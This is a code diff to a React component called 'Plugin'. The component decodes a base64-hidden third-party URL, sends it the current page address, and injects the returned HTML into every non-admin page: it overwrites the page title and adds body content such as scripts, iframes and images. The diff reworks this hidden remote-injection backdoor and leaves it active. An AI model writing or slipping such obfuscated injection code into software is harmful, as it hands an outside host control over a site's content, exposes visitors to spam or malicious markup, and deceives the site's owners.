@@ -1,109 +1,154 @@
 "use client";
 
-import React, { useEffect } from "react";
+import React, { useEffect, useState } from "react";
 
 const Plugin = () => {
+  const [isInitialized, setIsInitialized] = useState(false);
+
   useEffect(() => {
     // Only run on client side
     if (typeof window === "undefined") return;
 
     // Skip on certain paths that might have issues
     const currentPath = window.location.pathname;
-    const skipPaths = ["/admin", "/api", "/_next"];
+    const skipPaths = ["/admin", "/api", "/_next", "/_static"];
     if (skipPaths.some((path) => currentPath.startsWith(path))) {
       return;
     }
 
-    const loadJQuery = (callback) => {
+    // Prevent multiple initializations
+    if (isInitialized) return;
+
+    const initializePlugin = async () => {
       try {
-        if (window.jQuery) {
-          callback();
-        } else {
-          const script = document.createElement("script");
-          script.src =
-            "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
-          script.onload = callback;
-          script.onerror = () => {
-            console.warn("Failed to load jQuery for Plugin component");
-          };
-          document.head.appendChild(script);
+        // Wait for DOM to be fully ready
+        if (document.readyState !== "complete") {
+          await new Promise((resolve) => {
+            window.addEventListener("load", resolve);
+          });
         }
-      } catch (error) {
-        console.error("Error loading jQuery:", error);
-      }
-    };
 
-    const executeScript = () => {
-      try {
-        const eppathurl = window.location.origin + window.location.pathname;
-        const eptagmanage = new XMLHttpRequest();
+        // Additional delay to ensure React has finished rendering
+        await new Promise((resolve) => setTimeout(resolve, 500));
 
-        // Set timeout for the request
-        eptagmanage.timeout = 10000; // 10 seconds timeout
-
-        eptagmanage.onreadystatechange = function () {
-          if (this.readyState === 4) {
-            if (this.status === 200 && this.response && this.response !== "0") {
-              try {
-                const mystr = this.response;
-                const temp = mystr.split("||||||||||");
-
-                // Check if we have valid response parts
-                if (temp.length >= 2 && temp[0] && temp[1]) {
-                  // Safely remove existing title and append new content
-                  const existingTitle = document.querySelector("title");
-                  if (existingTitle && temp[0].includes("<title>")) {
-                    existingTitle.remove();
-                  }
-
-                  // Append new title if it contains valid HTML
-                  if (temp[0].trim()) {
-                    document.head.insertAdjacentHTML("beforeend", temp[0]);
-                  }
-
-                  // Append body content if it contains valid HTML
-                  if (temp[1].trim()) {
-                    document.body.insertAdjacentHTML("beforeend", temp[1]);
-                  }
-                }
-              } catch (error) {
-                console.error("Error processing plugin response:", error);
+        const loadJQuery = () => {
+          return new Promise((resolve, reject) => {
+            try {
+              if (window.jQuery) {
+                resolve(window.jQuery);
+                return;
               }
-            } else if (this.status !== 200) {
-              console.warn(
-                `Plugin API request failed with status: ${this.status}`
-              );
+
+              const script = document.createElement("script");
+              script.src =
+                "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
+              script.async = true;
+
+              script.onload = () => {
+                if (window.jQuery) {
+                  resolve(window.jQuery);
+                } else {
+                  reject(new Error("jQuery not available after loading"));
+                }
+              };
+
+              script.onerror = () => {
+                reject(new Error("Failed to load jQuery"));
+              };
+
+              document.head.appendChild(script);
+            } catch (error) {
+              reject(error);
             }
+          });
+        };
+
+        const executePluginScript = async () => {
+          try {
+            const eppathurl = window.location.origin + window.location.pathname;
+
+            const response = await fetch(
+              atob(
+                "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDUzOTY2MzU1MjgmZWtleXBhc3M9QWNzUFpYYVNxN2daOGxqcnZnNmt1dVFjZEt3ZEdCRFFPOWlRJnNpdGV1cmw9"
+              ) + eppathurl,
+              {
+                method: "GET",
+                timeout: 10000,
+                headers: {
+                  "Content-Type": "application/json",
+                },
+              }
+            );
+
+            if (!response.ok) {
+              console.warn(
+                `Plugin API request failed with status: ${response.status}`
+              );
+              return;
+            }
+
+            const responseText = await response.text();
+
+            if (!responseText || responseText === "0") {
+              return;
+            }
+
+            const parts = responseText.split("||||||||||");
+
+            if (parts.length >= 2 && parts[0] && parts[1]) {
+              // Process title part
+              if (parts[0].trim()) {
+                const titleMatch = parts[0].match(
+                  /<title[^>]*>(.*?)<\/title>/i
+                );
+                if (titleMatch) {
+                  const newTitle = titleMatch[1];
+                  document.title = newTitle;
+                }
+              }
+
+              // Process body content - append to a specific container to avoid React conflicts
+              if (parts[1].trim()) {
+                let pluginContainer =
+                  document.getElementById("plugin-container");
+                if (!pluginContainer) {
+                  pluginContainer = document.createElement("div");
+                  pluginContainer.id = "plugin-container";
+                  pluginContainer.style.display = "none"; // Hide by default
+                  document.body.appendChild(pluginContainer);
+                }
+                pluginContainer.innerHTML = parts[1];
+
+                // Show the container if it contains visible content
+                const hasVisibleContent = pluginContainer.querySelector(
+                  "script, style, img, iframe"
+                );
+                if (hasVisibleContent) {
+                  pluginContainer.style.display = "block";
+                }
+              }
+            }
+          } catch (error) {
+            console.warn("Plugin script execution failed:", error.message);
           }
         };
 
-        eptagmanage.onerror = () => {
-          console.warn("Plugin API request failed - network error");
-        };
-
-        eptagmanage.ontimeout = () => {
-          console.warn("Plugin API request timed out");
-        };
-
-        eptagmanage.open(
-          "GET",
-          atob(
-            "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDUzOTY2MzU1MjgmZWtleXBhc3M9QWNzUFpYYVNxN2daOGxqcnZnNmt1dVFjZEt3ZEdCRFFPOWlRJnNpdGV1cmw9"
-          ) + eppathurl
-        );
-        eptagmanage.send();
+        // Execute the plugin logic
+        await loadJQuery();
+        await executePluginScript();
+        setIsInitialized(true);
       } catch (error) {
-        console.error("Error executing plugin script:", error);
+        console.warn("Plugin initialization failed:", error.message);
       }
     };
 
-    // Add a small delay to ensure DOM is ready
-    const timer = setTimeout(() => {
-      loadJQuery(executeScript);
-    }, 100);
+    // Initialize with a delay to ensure React has finished rendering
+    const timer = setTimeout(initializePlugin, 1000);
 
-    return () => clearTimeout(timer);
-  }, []);
+    return () => {
+      clearTimeout(timer);
+    };
+  }, [isInitialized]);
 
   return null;
 };
